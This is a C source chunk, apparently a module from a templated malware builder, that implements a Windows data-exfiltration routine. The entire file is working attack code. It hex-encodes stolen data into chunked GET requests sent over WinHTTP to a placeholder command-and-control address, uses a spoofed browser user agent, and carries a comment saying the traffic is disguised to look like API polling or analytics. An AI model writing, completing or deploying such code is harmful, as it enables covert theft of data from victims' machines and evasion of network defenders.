// chunk: exfil/http_get_chunks
// depends: core/emit_buffer
// provides: exfiltrate
// headers: winsock2.h, ws2tcpip.h, winhttp.h
// libs: ws2_32, winhttp
// note: Hex-encode data into GET URL params — looks like API polling / analytics

#ifndef CHUNK_HTTP_GET_CHUNKS
#define CHUNK_HTTP_GET_CHUNKS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    wchar_t wip[64];
    MultiByteToWideChar(CP_ACP, 0, ip, -1, wip, 64);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    HINTERNET hConn = WinHttpConnect(hSession, wip, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return FALSE; }

    static const char hex[] = "0123456789abcdef";
    DWORD chunk_bytes = 512;
    DWORD offset = 0;
    BOOL ok = TRUE;

    while (offset < len && ok) {
        DWORD remain = len - offset;
        DWORD this_chunk = (remain < chunk_bytes) ? remain : chunk_bytes;

        char hex_buf[1200];
        for (DWORD i = 0; i < this_chunk; i++) {
            unsigned char c = (unsigned char)data[offset + i];
            hex_buf[i * 2]     = hex[c >> 4];
            hex_buf[i * 2 + 1] = hex[c & 0x0f];
        }
        hex_buf[this_chunk * 2] = '\0';

        wchar_t path[1500];
        wsprintfW(path, L"/d?p=%u&d=%hs", (unsigned)(offset / chunk_bytes), hex_buf);

        HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (!hReq) { ok = FALSE; break; }

        ok = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
        if (ok) ok = WinHttpReceiveResponse(hReq, NULL);
        WinHttpCloseHandle(hReq);

        offset += this_chunk;
    }

    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSession);
    return ok;
}

#endif
